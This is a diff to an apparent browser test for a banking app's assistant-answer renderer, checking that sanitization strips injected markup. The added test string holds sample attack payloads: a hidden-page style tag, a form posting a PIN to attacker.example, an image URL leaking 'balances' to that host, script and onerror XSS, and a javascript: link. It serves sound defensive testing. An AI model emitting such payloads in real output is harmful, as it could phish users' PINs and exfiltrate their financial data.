@@ -188,6 +188,19 @@ def test_assistant_markup_is_sanitized(server, browser):
         assert "onerror" not in html and "<script" not in html and "<strong>ok</strong>" in html
         plain = page.evaluate("""() => Banko.stripCitations('Lunch [txn:abc] and [ txn : 1234 ] done')""")
         assert plain == "Lunch and done"
+        # What the assistant really renders: one answer must not be able to
+        # blank the app, collect a PIN, or fetch an outside image.
+        hostile = ("**ok** <style>body{display:none}</style>\n\n"
+                   "<form action='https://attacker.example/steal'><input name=pin><button>Verify</button></form>\n\n"
+                   "![chart](https://attacker.example/p.png?q=balances) <img src=x onerror=alert(1)><script>alert(2)</script>\n\n"
+                   "[click](javascript:alert(1)) and [the docs](https://www.cockroachlabs.com/docs/)\n\n"
+                   "| Category | Total |\n|:--|--:|\n| Dining | $42 |\n\n- one\n- two [txn:abc]")
+        rendered = page.evaluate("(s) => Banko.renderAnswer(s)", hostile)
+        for banned in ("<style", "display:none", "<form", "<input", "<button", "<img", "attacker.example",
+                       "javascript:", "onerror", "<script", "[txn:"):
+            assert banned not in rendered, banned
+        assert "<strong>ok</strong>" in rendered and "<table>" in rendered and "<li>one</li>" in rendered
+        assert 'href="https://www.cockroachlabs.com/docs/"' in rendered and 'rel="noopener noreferrer"' in rendered
     finally:
         ctx.close()
 
